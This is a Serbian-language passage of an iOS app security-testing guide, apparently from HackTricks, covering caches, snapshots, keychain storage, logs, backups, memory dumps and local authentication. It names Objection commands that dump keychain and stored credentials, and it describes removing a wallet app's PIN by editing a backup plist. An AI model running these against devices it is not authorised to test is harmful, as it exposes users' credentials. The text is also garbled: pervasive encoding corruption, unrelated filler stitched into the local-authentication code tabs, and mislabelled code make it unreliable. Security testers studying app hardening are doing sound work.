1. PreporuÄuje se uklanjanje keÅ¡iranih odgovora nakon odjave. To se moÅ¾e uraditi pomoÄ‡u pruÅ¾ene metode od strane Apple-a nazvane [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) MoÅ¾ete pozvati ovu metodu na sledeÄ‡i naÄin:

`URLCache.shared.removeAllCachedResponses()`

Ova metoda Ä‡e ukloniti sve keÅ¡irane zahteve i odgovore iz Cache.db fajla.
2. Ako ne treba da koristite prednost kolaÄiÄ‡a, preporuÄuje se koriÅ¡Ä‡enje svojstva konfiguracije [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) URLSession, Å¡to Ä‡e onemoguÄ‡iti Äuvanje kolaÄiÄ‡a i keÅ¡a.

[Apple dokumentacija](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Objekat konfiguracije sesije ephemeral je sliÄan objektu konfiguracije sesije po podrazumevanim vrednostima (videti default), osim Å¡to odgovarajuÄ‡i objekat sesije ne Äuva keÅ¡, skladiÅ¡ta akreditacija ili bilo koje podatke vezane za sesiju na disku. Umesto toga, podaci vezani za sesiju se Äuvaju u RAM-u. Jedini put kada sesija ephemeral piÅ¡e podatke na disk je kada mu kaÅ¾ete da zapiÅ¡e sadrÅ¾aj URL-a u fajl.`
3. KeÅ¡ takoÄ‘e moÅ¾e biti onemoguÄ‡en postavljanjem Politike keÅ¡iranja na [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). OnemoguÄ‡iÄ‡e Äuvanje keÅ¡a na bilo koji naÄin, bilo u memoriji ili na disku.

### Snimci

Kada pritisnete dugme za poÄetni ekran, iOS **pravi snimak trenutnog ekrana** kako bi mogao da izvrÅ¡i tranziciju ka aplikaciji na mnogo glaÄ‘i naÄin. MeÄ‘utim, ako je **osetljivih podataka** prisutno na trenutnom ekranu, biÄ‡e **saÄuvani** u **slici** (koja **traje** **preko** **ponovnog pokretanja**). Ovo su snimci do kojih moÅ¾ete pristupiti i dvostrukim dodirivanjem poÄetnog ekrana kako biste preÅ¡li izmeÄ‘u aplikacija.

Osoba koja **napada** mora imati **pristup** **ureÄ‘aju** **odblokiranom** da bi videla ove snimke, osim ako je iPhone jailbroken. Podrazumevano, poslednji snimak se Äuva u sandbox-u aplikacije u `Library/Caches/Snapshots/` ili `Library/SplashBoard/Snapshots` folderu (povereni raÄunari ne mogu pristupiti fajl sistemu od iOX 7.0).

Jedan naÄin da se spreÄi ovo loÅ¡e ponaÅ¡anje je da se postavi prazan ekran ili uklone osetljivi podaci pre nego Å¡to se napravi snimak koriÅ¡Ä‡enjem funkcije `ApplicationDidEnterBackground()`.

U nastavku je prikazan primer metode za otklanjanje problema koji Ä‡e postaviti podrazumevani snimak.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
**Objective-C:**
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Ovo postavlja pozadinsku sliku na `overlayImage.png` kada se aplikacija prebaci u pozadinu. To spreÄava curenje osetljivih podataka jer Ä‡e `overlayImage.png` uvek prebrisati trenutni prikaz.

### Keychain

Za pristupanje i upravljanje iOS keÅ¡om, dostupni su alati poput [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper), pogodni za jailbroken ureÄ‘aje. Dodatno, [**Objection**](https://github.com/sensepost/objection) pruÅ¾a komandu `ios keychain dump` za sliÄne svrhe.

#### **ÄŒuvanje akreditiva**

Klasa **NSURLCredential** je idealna za Äuvanje osetljivih informacija direktno u keÅ¡u, zaobilazeÄ‡i potrebu za NSUserDefaults-om ili drugim omotaÄima. Za Äuvanje akreditiva nakon prijave, koristi se sledeÄ‡i Swift kod:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Za izvlaÄenje ovih saÄuvanih akreditiva, koristi se Objection-ova komanda `ios nsurlcredentialstorage dump`.

## **PrilagoÄ‘ene tastature i keÅ¡ tastature**

Od iOS 8.0 nadalje, korisnici mogu instalirati prilagoÄ‘ene ekstenzije tastature, koje se mogu upravljati pod **Settings > General > Keyboard > Keyboards**. Iako ove tastature nude proÅ¡irenu funkcionalnost, predstavljaju rizik od beleÅ¾enja pritisaka tastera i slanja podataka eksternim serverima, iako korisnici dobijaju obaveÅ¡tenje o tastaturama koje zahtevaju pristup mreÅ¾i. Aplikacije mogu, i trebalo bi, ograniÄiti upotrebu prilagoÄ‘enih tastatura za unos osetljivih informacija.

**Preporuke za bezbednost:**

* PreporuÄuje se onemoguÄ‡avanje tastatura treÄ‡ih strana radi poboljÅ¡ane bezbednosti.
* Budite svesni funkcija automatske ispravke i automatskih predloga podrazumevane iOS tastature, koje mogu Äuvati osetljive informacije u keÅ¡ fajlovima smeÅ¡tenim u `Library/Keyboard/{locale}-dynamic-text.dat` ili `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Ovi keÅ¡ fajlovi treba redovno proveravati radi osetljivih podataka. PreporuÄuje se resetovanje reÄnika tastature putem opcije **Settings > General > Reset > Reset Keyboard Dictionary** radi brisanja keÅ¡iranih podataka.
* Presretanje mreÅ¾nog saobraÄ‡aja moÅ¾e otkriti da li prilagoÄ‘ena tastatura daljinski prenosi pritiske tastera.

### **Prevencija keÅ¡iranja polja za unos teksta**

Protokol [UITextInputTraits](https://developer.apple.com/reference/uikit/uitextinputtraits) nudi osobine za upravljanje automatskom ispravkom i bezbednim unosom teksta, Å¡to je kljuÄno za spreÄavanje keÅ¡iranja osetljivih informacija. Na primer, onemoguÄ‡avanje automatske ispravke i omoguÄ‡avanje bezbednog unosa teksta moÅ¾e se postiÄ‡i sa:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Dodatno, programeri treba da se pobrinu da tekstualna polja, posebno ona namenjena za unos osetljivih informacija poput lozinki i PIN-ova, onemoguÄ‡e keÅ¡iranje postavljanjem `autocorrectionType` na `UITextAutocorrectionTypeNo` i `secureTextEntry` na `YES`.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Logovi**

Otklanjanje greÅ¡aka u kodu Äesto ukljuÄuje koriÅ¡Ä‡enje **logova**. Postoji rizik jer **logovi mogu sadrÅ¾avati osetljive informacije**. Ranije, u iOS 6 i starijim verzijama, logovi su bili dostupni svim aplikacijama, Å¡to je predstavljalo rizik od curenja osetljivih podataka. **Sada su aplikacije ograniÄene na pristup samo svojim logovima**.

Uprkos ovim ograniÄenjima, **napadaÄ sa fiziÄkim pristupom** otkljuÄanom ureÄ‘aju i dalje moÅ¾e iskoristiti to povezivanjem ureÄ‘aja sa raÄunarom i **Äitanjem logova**. VaÅ¾no je napomenuti da logovi ostaju na disku Äak i nakon deinstalacije aplikacije.

Da bi se smanjili rizici, preporuÄuje se **temeljno interagovanje sa aplikacijom**, istraÅ¾ujuÄ‡i sve njene funkcionalnosti i ulaze kako bi se osiguralo da se sluÄajno ne beleÅ¾e osetljive informacije.

Prilikom pregleda izvornog koda aplikacije radi potencijalnih curenja, potraÅ¾ite kako **unapred definisane** tako i **prilagoÄ‘ene izjave za logovanje** koristeÄ‡i kljuÄne reÄi poput `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` za ugraÄ‘ene funkcije, i bilo kakve pomenute `Logging` ili `Logfile` za prilagoÄ‘ene implementacije.

### **Pratite Logove Sistemskog Nadzora**

Aplikacije beleÅ¾e razliÄite informacije koje mogu biti osetljive. Za praÄ‡enje ovih logova, alati i komande poput:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
Su korisne. Dodatno, **Xcode** pruÅ¾a naÄin za prikupljanje konzolnih zapisa:

1. Otvorite Xcode.
2. PoveÅ¾ite iOS ureÄ‘aj.
3. Idite na **Prozor** -> **UreÄ‘aji i Simulatori**.
4. Izaberite svoj ureÄ‘aj.
5. Pokrenite problem koji istraÅ¾ujete.
6. Koristite dugme **Otvori konzolu** da biste pregledali zapise u novom prozoru.

Za naprednije beleÅ¾enje, povezivanje sa ljuskom ureÄ‘aja i koriÅ¡Ä‡enje **socat**-a moÅ¾e omoguÄ‡iti praÄ‡enje logova u realnom vremenu:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
PrateÄ‡i komande za posmatranje aktivnosti dnevnika, koje mogu biti od neprocenjive vrednosti za dijagnostikovanje problema ili identifikaciju potencijalnog curenja podataka u dnevnicima.

***

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako kreirali i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Rezervne kopije

**Automatske funkcije rezervnog kopiranja** su integrisane u iOS, olakÅ¡avajuÄ‡i kreiranje kopija podataka ureÄ‘aja putem iTunes-a (do macOS Catalina), Finder-a (od macOS Catalina nadalje) ili iCloud-a. Ove rezervne kopije obuhvataju skoro sve podatke ureÄ‘aja, iskljuÄujuÄ‡i visoko osetljive elemente poput detalja Apple Pay-a i konfiguracija Touch ID-a.

### Bezbednosni rizici

UkljuÄivanje **instaliranih aplikacija i njihovih podataka** u rezervne kopije postavlja pitanje potencijalnog **curenja podataka** i rizika da **modifikacije rezervne kopije mogu promeniti funkcionalnost aplikacije**. PreporuÄuje se **ne Äuvati osetljive informacije u obiÄnom tekstu** unutar direktorijuma bilo koje aplikacije ili njenih poddirektorijuma kako bi se umanjili ovi rizici.

### IskljuÄivanje datoteka iz rezervnih kopija

Datoteke u `Documents/` i `Library/Application Support/` se podrazumevano rezervno kopiraju. Razvojni programeri mogu iskljuÄiti odreÄ‘ene datoteke ili direktorijume iz rezervnih kopija koristeÄ‡i `NSURL setResourceValue:forKey:error:` sa `NSURLIsExcludedFromBackupKey`. Ova praksa je kljuÄna za zaÅ¡titu osetljivih podataka od ukljuÄivanja u rezervne kopije.

### Testiranje ranjivosti

Da biste procenili sigurnost rezervne kopije aplikacije, poÄnite sa **kreiranjem rezervne kopije** koristeÄ‡i Finder, a zatim je locirajte koristeÄ‡i smernice iz [zvaniÄne dokumentacije kompanije Apple](https://support.apple.com/en-us/HT204215). Analizirajte rezervnu kopiju u potrazi za osetljivim podacima ili konfiguracijama koje bi mogle biti promenjene kako bi uticale na ponaÅ¡anje aplikacije.

Osetljive informacije mogu se pronaÄ‡i koriÅ¡Ä‡enjem alata komandne linije ili aplikacija poput [iMazing](https://imazing.com). Za Å¡ifrovane rezervne kopije, prisustvo Å¡ifrovanja moÅ¾e se potvrditi proverom kljuÄa "IsEncrypted" u fajlu "Manifest.plist" na korenu rezervne kopije.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
### Modifikovanje ponaÅ¡anja aplikacije

Primer modifikovanja ponaÅ¡anja aplikacije putem izmena u rezervnim kopijama je prikazan u aplikaciji za novÄanik bitkoina [Bither](https://github.com/bither/bither-ios), gde se PIN za zakljuÄavanje UI Äuva unutar `net.bither.plist` pod kljuÄem **pin\_code**. Uklanjanje ovog kljuÄa iz plist datoteke i vraÄ‡anje rezervne kopije uklanja zahtev za PIN-om, pruÅ¾ajuÄ‡i neograniÄen pristup.

## Rezime testiranja memorije za osetljive podatke

Prilikom rukovanja osetljivim informacijama koje se Äuvaju u memoriji aplikacije, kljuÄno je ograniÄiti vreme izlaganja ovih podataka. Postoje dva osnovna pristupa za istraÅ¾ivanje sadrÅ¾aja memorije: **kreiranje ispisa memorije** i **analiza memorije u realnom vremenu**. Oba metoda imaju svoje izazove, ukljuÄujuÄ‡i potencijal za propuÅ¡tanje kljuÄnih podataka tokom procesa ispisa ili analize.

## **Dobijanje i analiza ispisa memorije**

Za ureÄ‘aje sa i bez dÅ¾ailbrejka, alati poput [objection](https://github.com/sensepost/objection) i [Fridump](https://github.com/Nightbringer21/fridump) omoguÄ‡avaju ispisivanje memorije procesa aplikacije. Nakon Å¡to se ispise, analiza ovih podataka zahteva razliÄite alate, u zavisnosti od prirode informacija koje traÅ¾ite.

Za izvlaÄenje nizova iz ispisa memorije, mogu se koristiti komande poput `strings` ili `rabin2 -zz`:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Za detaljniju analizu, ukljuÄujuÄ‡i pretragu specifiÄnih tipova podataka ili obrazaca, **radare2** nudi obimne moguÄ‡nosti pretrage:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Analiza memorije u toku izvrÅ¡avanja**

**r2frida** pruÅ¾a moÄ‡nu alternativu za inspekciju memorije aplikacije u realnom vremenu, bez potrebe za memorijalnim ispuÅ¡tanjem. Ovaj alat omoguÄ‡ava izvrÅ¡avanje pretraga direktno na memoriji aplikacije koja se izvrÅ¡ava:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## OÅ¡teÄ‡ena Kriptografija

### Slabi Procesi Upravljanja KljuÄevima

Neki programeri Äuvaju osetljive podatke u lokalnom skladiÅ¡tu i Å¡ifriraju ih kljuÄem koji je unapred definisan/predvidljiv u kodu. Ovo ne bi trebalo raditi jer neko ko vrÅ¡i reverzni inÅ¾enjering moÅ¾e omoguÄ‡iti napadaÄima da izvuku poverljive informacije.

### KoriÅ¡Ä‡enje Nesigurnih i/ili Zastarelih Algoritama

Programeri ne bi trebalo da koriste **zastarele algoritme** za izvoÄ‘enje **provera autorizacije**, **Äuvanje** ili **slanje** podataka. Neki od ovih algoritama su: RC4, MD4, MD5, SHA1... Ako se **heÅ¡evi** koriste za Äuvanje lozinki na primer, trebalo bi koristiti heÅ¡eve otporne na napade brute-force zajedno sa solju.

### Provera

Glavne provere koje treba izvrÅ¡iti su da li moÅ¾ete pronaÄ‡i **unapred definisane** lozinke/tajne u kodu, ili da li su one **predvidljive**, i da li kod koristi neku vrstu **slabe** **kriptografske** algoritme.

Zanimljivo je znati da moÅ¾ete **nadgledati** neke **kripto** **biblioteke** automatski koristeÄ‡i **objection** sa:
```swift
ios monitor crypt
```
Za **viÅ¡e informacija** o iOS kriptografskim API-ima i bibliotekama posetite [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Lokalna autentikacija

**Lokalna autentikacija** igra kljuÄnu ulogu, posebno kada je u pitanju obezbeÄ‘ivanje pristupa na udaljenom krajnjem taÄkom putem kriptografskih metoda. SuÅ¡tina ovde je da bez pravilne implementacije, mehanizmi lokalne autentikacije mogu biti zaobiÄ‘eni.

Apple-ov [**Lokalni autentikacioni okvir**](https://developer.apple.com/documentation/localauthentication) i [**kljuÄnik**](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) pruÅ¾aju snaÅ¾ne API-je za programere kako bi olakÅ¡ali dijaloge autentikacije korisnika i sigurno rukovali tajnim podacima, redom. Secure Enclave obezbeÄ‘uje ID otiska prsta za Touch ID, dok se Face ID oslanja na prepoznavanje lica bez ugroÅ¾avanja biometrijskih podataka.

Da bi integrisali Touch ID/Face ID, programeri imaju dva izbora API-ja:

* **`LocalAuthentication.framework`** za autentikaciju korisnika na visokom nivou bez pristupa biometrijskim podacima.
* **`Security.framework`** za pristup uslugama kljuÄnika na niÅ¾em nivou, obezbeÄ‘ujuÄ‡i tajne podatke biometrijskom autentikacijom. RazliÄiti [omotaÄi otvorenog koda](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) olakÅ¡avaju pristup kljuÄniku.

{% hint style="opasnost" %}
MeÄ‘utim, kako `LocalAuthentication.framework` i `Security.framework` predstavljaju ranjivosti, poÅ¡to uglavnom vraÄ‡aju boolean vrednosti bez prenosa podataka za autentikacione procese, Äine ih podloÅ¾nim zaobilaÅ¾enju (videti [Ne dodiruj me na taj naÄin, od strane Davida Lindnera i drugih](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Implementacija lokalne autentikacije

Da bi korisnike uputili na autentikaciju, programeri treba da koriste metodu **`evaluatePolicy`** unutar klase **`LAContext`**, birajuÄ‡i izmeÄ‘u:

* **`deviceOwnerAuthentication`**: TraÅ¾i Touch ID ili Å¡ifru ureÄ‘aja, neuspeÅ¡no ako nijedno nije omoguÄ‡eno.
* **`deviceOwnerAuthenticationWithBiometrics`**: IskljuÄivo traÅ¾i Touch ID.

UspeÅ¡na autentikacija se oznaÄava boolean vrednoÅ¡Ä‡u koja se vraÄ‡a iz **`evaluatePolicy`**, istiÄuÄ‡i potencijalnu sigurnosnu manu.

### Lokalna autentikacija koriÅ¡Ä‡enjem kljuÄnika

Implementacija **lokalne autentikacije** u iOS aplikacijama ukljuÄuje koriÅ¡Ä‡enje **kljuÄniÄkih API-ja** za sigurno Äuvanje tajnih podataka kao Å¡to su autentikacioni tokeni. Ovaj proces osigurava da podaci mogu biti pristupljeni samo od strane korisnika, koriÅ¡Ä‡enjem Å¡ifre ureÄ‘aja ili biometrijske autentikacije poput Touch ID-a.

KljuÄnik nudi moguÄ‡nost postavljanja stavki sa atributom `SecAccessControl`, koji ograniÄava pristup stavci dok korisnik uspeÅ¡no autentikuje putem Touch ID-a ili Å¡ifre ureÄ‘aja. Ova funkcija je kljuÄna za unapreÄ‘enje sigurnosti.

Ispod su primeri koda u Swift-u i Objective-C koji demonstriraju kako saÄuvati i povratiti string u/iz kljuÄnika, koristeÄ‡i ove sigurnosne funkcije. Primeri posebno pokazuju kako postaviti kontrolu pristupa da zahteva autentikaciju putem Touch ID-a i osigura da su podaci dostupni samo na ureÄ‘aju na kojem su postavljeni, pod uslovom da je konfigurisana Å¡ifra ureÄ‘aja.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %} 

### Analiza statiÄkog koda

Analiza statiÄkog koda je vaÅ¾an korak u procesu testiranja bezbednosti iOS aplikacija. Alati poput *Clang Static Analyzer* i *Xcode LLVM Clang Static Analyzer* mogu pomoÄ‡i u otkrivanju potencijalnih greÅ¡aka u kodu koje bi mogle dovesti do bezbednosnih propusta. Ovi alati mogu identifikovati probleme poput neinicijalizovanih promenljivih, greÅ¡aka u upravljanju memorijom i drugih potencijalno opasnih uzoraka u kodu. 

### Analiza dinamiÄkog koda

Analiza dinamiÄkog koda u iOS aplikacijama moÅ¾e se obaviti koriÅ¡Ä‡enjem alata kao Å¡to su *Cycript* i *Frida*. Ovi alati omoguÄ‡avaju hakovanje i manipulaciju aplikacijom u realnom vremenu, Å¡to moÅ¾e biti korisno za pronalaÅ¾enje bezbednosnih propusta ili ranjivosti. KoriÅ¡Ä‡enje ovih alata za analizu ponaÅ¡anja aplikacije u realnom vremenu moÅ¾e otkriti potencijalne probleme koji se ne mogu detektovati analizom statiÄkog koda. 

### Reversing i dekompilacija

Reversing i dekompilacija su tehnike koje se Äesto koriste u procesu testiranja bezbednosti iOS aplikacija. KoriÅ¡Ä‡enjem alata poput *Hopper Disassembler* ili *IDA Pro*, istraÅ¾ivaÄi mogu analizirati izvorni kod aplikacije, identifikovati kljuÄne funkcije i otkriti potencijalne ranjivosti. Ove tehnike mogu biti korisne za razumevanje kako aplikacija funkcioniÅ¡e i pronalaÅ¾enje skrivenih funkcionalnosti ili ranjivosti. 

### Sigurnosne provjere API-ja

Prilikom testiranja bezbednosti iOS aplikacija, vaÅ¾no je sprovesti sigurnosne provjere API-ja koje aplikacija koristi. Ovo ukljuÄuje proveru da li se API-ji pravilno koriste, da li postoji adekvatna autentikacija i autorizacija, kao i da li postoji zaÅ¡tita od uobiÄajenih napada poput SQL injection ili XSS napada. Analiza API-ja moÅ¾e otkriti potencijalne ranjivosti koje bi mogle biti iskoriÅ¡Ä‡ene za napad na aplikaciju. 

### Testiranje autentikacije i autorizacije

Autentikacija i autorizacija su kljuÄni delovi bezbednosti iOS aplikacija. Prilikom testiranja autentikacije, vaÅ¾no je proveriti da li su implementirani sigurni mehanizmi za proveru identiteta korisnika, kao i da li postoji zaÅ¡tita od uobiÄajenih napada poput brute force napada. Testiranje autorizacije treba da proveri da li su korisnicima dodeljene samo neophodne privilegije i da li postoji zaÅ¡tita od neovlaÅ¡Ä‡enog pristupa funkcionalnostima aplikacije. 

### Testiranje skladiÅ¡tenja podataka

Bezbedno skladiÅ¡tenje podataka je kljuÄni aspekt bezbednosti iOS aplikacija. Prilikom testiranja skladiÅ¡tenja podataka, vaÅ¾no je proveriti da li se osetljivi podaci adekvatno Å¡ifruju pre Äuvanja na ureÄ‘aju, da li postoji zaÅ¡tita od neovlaÅ¡Ä‡enog pristupa podacima i da li se pravilno upravlja sesijama i keÅ¡iranjem podataka. Testiranje skladiÅ¡tenja podataka moÅ¾e otkriti potencijalne ranjivosti koje bi mogle dovesti do neovlaÅ¡Ä‡enog pristupa ili curenja podataka. 

### Testiranje komunikacije

Bezbedna komunikacija je od suÅ¡tinskog znaÄaja za bezbednost iOS aplikacija koje razmenjuju podatke preko mreÅ¾e. Prilikom testiranja komunikacije, vaÅ¾no je proveriti da li se podaci adekvatno Å¡ifruju prilikom prenosa preko nezaÅ¡tiÄ‡enih mreÅ¾a, da li postoji validacija sertifikata radi spreÄavanja Man-in-the-Middle napada i da li se koriste sigurni protokoli poput HTTPS. Testiranje komunikacije moÅ¾e otkriti potencijalne ranjivosti koje bi mogle dovesti do curenja osetljivih informacija tokom komunikacije. 

### Testiranje bezbednosti korisnika

Korisnici su Äesto najslabija karika u lancu bezbednosti iOS aplikacija. Prilikom testiranja bezbednosti korisnika, vaÅ¾no je proveriti da li su implementirane sigurnosne funkcionalnosti poput dvofaktorske autentikacije, obaveÅ¡tenja o sumnjivim aktivnostima i moguÄ‡nost promene lozinke. TakoÄ‘e je vaÅ¾no proveriti da li korisnici dobijaju adekvatne informacije o bezbednosnim rizicima i kako se postupa u sluÄaju incidenta. 

### Testiranje otpornosti na napade

Testiranje otpornosti na napade je vaÅ¾an deo procesa testiranja bezbednosti iOS aplikacija. Ovo ukljuÄuje simuliranje razliÄitih vrsta napada poput SQL injection, XSS, CSRF i ostalih uobiÄajenih napada kako bi se proverila otpornost aplikacije na ove vrste napada. Testiranje otpornosti na napade moÅ¾e pomoÄ‡i u identifikaciji potencijalnih ranjivosti i poboljÅ¡anju bezbednosti aplikacije pre nego Å¡to bude izloÅ¾ena stvarnim napadima. 

### IzveÅ¡tavanje i praÄ‡enje

IzveÅ¡tavanje o rezultatima testiranja bezbednosti iOS aplikacija je vaÅ¾an korak u procesu poboljÅ¡anja bezbednosti. IzveÅ¡taji treba da sadrÅ¾e detaljne informacije o pronaÄ‘enim ranjivostima, preporuÄene korake za njihovo otklanjanje i procenu rizika koje ranjivosti predstavljaju po aplikaciju. PraÄ‡enje implementacije preporuÄenih ispravki i redovno testiranje bezbednosti su kljuÄni za odrÅ¾avanje visokog nivoa bezbednosti iOS aplikacija. 

{% endtab %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

Sada moÅ¾emo zatraÅ¾iti saÄuvanu stavku iz lanca kljuÄeva. Usluge lanca kljuÄeva Ä‡e prikazati dijalog za autentifikaciju korisniku i vratiti podatke ili nil u zavisnosti da li je pruÅ¾en odgovarajuÄ‡i otisak prsta ili ne.
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %} 

## Analiza statiÄkog koda

Analiza statiÄkog koda je proces pregledanja izvornog koda aplikacije kako bi se pronaÅ¡le potencijalne ranjivosti ili sigurnosni propusti. Ovaj proces moÅ¾e otkriti probleme poput hardkodiranih lozinki, nedostataka u kontroli pristupa ili drugih sigurnosnih propusta. Postoje alati poput *Clang Static Analyzer* koji mogu pomoÄ‡i u otkrivanju ovih problema u Objective-C kodu. 

## PronalaÅ¾enje ranjivosti u Objective-C kodu

Prilikom analize Objective-C koda, vaÅ¾no je obratiti paÅ¾nju na potencijalne ranjivosti kao Å¡to su SQL injection, XSS napadi, nedostaci u kontroli pristupa i sl. KoriÅ¡Ä‡enje alata za statiÄku analizu koda moÅ¾e biti od velike pomoÄ‡i u identifikaciji ovih ranjivosti pre nego Å¡to aplikacija bude puÅ¡tena u produkciju. 

## KoriÅ¡Ä‡enje alata za analizu statiÄkog koda

Postoje razni alati koji mogu pomoÄ‡i u analizi statiÄkog koda Objective-C aplikacija. Neke od popularnih opcija ukljuÄuju *Xcode*, *Clang Static Analyzer*, *OCLint* i *Infer*. KoriÅ¡Ä‡enje ovih alata moÅ¾e znaÄajno poboljÅ¡ati sigurnost vaÅ¡e aplikacije identifikujuÄ‡i potencijalne ranjivosti pre nego Å¡to postanu ozbiljan problem. 

{% endtab %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
### Otkrivanje

KoriÅ¡Ä‡enje okvira u aplikaciji takoÄ‘e moÅ¾e biti otkriveno analiziranjem liste deljenih dinamiÄkih biblioteka aplikacije. To se moÅ¾e uraditi koriÅ¡Ä‡enjem `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
Ako se koristi `LocalAuthentication.framework` u aplikaciji, izlaz Ä‡e sadrÅ¾ati obe sledeÄ‡e linije (imajte na umu da `LocalAuthentication.framework` koristi `Security.framework` ispod haube):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Ako se koristi `Security.framework`, prikazan Ä‡e biti samo drugi.

